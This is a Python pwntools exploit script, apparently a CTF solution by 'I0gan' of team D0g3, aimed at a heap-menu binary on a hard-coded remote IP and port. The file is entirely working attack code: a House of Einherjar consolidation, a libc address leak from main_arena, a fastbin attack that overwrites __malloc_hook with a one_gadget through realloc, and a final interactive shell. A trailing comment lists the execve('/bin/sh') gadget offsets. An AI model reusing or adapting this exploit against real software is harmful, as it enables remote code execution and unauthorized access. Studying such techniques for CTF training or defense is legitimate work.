#!/usr/bin/env python
#-*- coding:utf-8 -*-

# Author: I0gan
# Team  : D0g3

from pwn import *
#from LibcSearcher import LibcSearcher

#context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'

#context(arch = 'i386', os = 'linux', log_level='debug')
context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile  = "pwn"
libFile  = "./libc.so.6"
#libFile  = "/lib/x86_64-linux-gnu/libc.so.6"

remoteIp = "39.97.119.22"
remotePort = 10002

LOCAL = 0
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
pd32  = lambda x : p32(x).decode() #python3 not surport str + bytes
pd64  = lambda x : p64(x).decode()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def ad(size, text):
	sla('>>', str(1))
	sla('???', str(size))
	sa(':>', text)


def rm(idx):
	sla('>>', str(2))
	sla('???', str(idx))

def dp(idx):
	sla('>>', str(3))	
	sla('???', str(idx))

def q():
	sla('>>', str(4))	

#--------------------------Exploit--------------------------
def exploit():
	ad(0x80,  'A\n') #idx 0
	ad(0x80,  'B\n') #idx 1
	ad(0x68,  'C\n') #idx 2
	ad(0xF0,  'D\n') #idx 3
	ad(0x68,  'E\n') #idx 4

	rm(2)

	p = 'A' * 0x60
	p += p64(0xda0 - 0xc10)
	ad(0x68, p)

	rm(2) #before emerge mem preparing fastbin attack
	# house of einharjar
	rm(0)
	rm(3)

	# show main_arena
	ad(0x80, '\n')
	dp(1)
	main_arena = u64(ru('\x7f')[-5:] + '\x7f\x00\x00') - 0x58
	libc_base = main_arena - 0x3c4b20
	li('main_arena ' + hex(main_arena))
	li('libc_base  ' + hex(libc_base))
	
	#fastbin attack to malloc_hook
	p = 'B' * 0x80
	p += p64(0)
	p += p64(0x71)
	p += p64(main_arena - 0x33)
	p += '\n'
	ad(0xA0, p)


	ad(0x68, '\n')
	# modify __malloc_hook as one gadget
	gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
	one_gadget = gadget[2] + libc_base
	realloc_addr = libc_base + lib.sym['realloc']
	li('realloc_addr ' + hex(realloc_addr))

	p = '\x11' * (0x13 - 0x8)
	p += p64(one_gadget)
	p += p64(realloc_addr + 12) #ajust execve second perm as 0
	p += '\n'
	ad(0x68, p)

	# get shell
	sla('>>', '1')
	sl('10')

def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()
'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
[rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
[rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
[rsp+0x70] == NULL
'''
